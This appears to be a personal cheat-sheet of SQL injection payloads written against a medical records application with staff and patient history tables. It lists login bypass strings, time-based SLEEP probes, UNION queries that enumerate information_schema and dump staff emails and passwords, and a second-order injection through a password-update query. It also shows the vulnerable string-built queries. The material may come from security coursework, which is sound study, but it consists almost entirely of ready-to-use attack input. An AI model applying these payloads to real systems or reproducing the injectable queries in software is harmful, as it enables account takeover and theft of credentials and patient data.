# login query staff: Bypass Authentication

SELECT * FROM `staff_table` WHERE `email`= '$email' AND `password`='$password';
SELECT * FROM `staff_table` WHERE `email`= 'username' or 1=1 ; -- #' AND `password`='$password';

# $email = username' or 1=1 ; -- # 
# $password = 12345
 




# Patient History: Extracting Data
# injectabale or NOT : user1@gmail.com' AND 1 = SLEEP(4); -- ;
# Random user: username' or 1 = SLEEP(4); -- ;



SELECT * FROM `medical_history_patient` WHERE `email` = '$email';
# username-


# username' UNION (SELECT 1,2,3,4, 4, 6,7,8,9,10,11,12 FROM DUAL) -- ;
# username' UNION (SELECT 1,2,3,4,TABLE_NAME,TABLE_SCHEMA,7,8,9,10,11,12 FROM information_schema.tables) -- ';;;
# username' UNION (SELECT 1,2,3,4, COLUMN_NAME,TABLE_NAME,7,8,9,10,11,12 FROM information_schema.columns WHERE TABLE_NAME='staff_table') -- ;
# username' UNION (SELECT 1,2,3,4, email,password,7,8,9,10,11,12 FROM staff_table) -- ';;;



# Update password : Second Order Attack
UPDATE `staff_table` SET `password` = '$npassword' WHERE `staff_table`.`email` = '$email';
# username = admin@admin' -- 
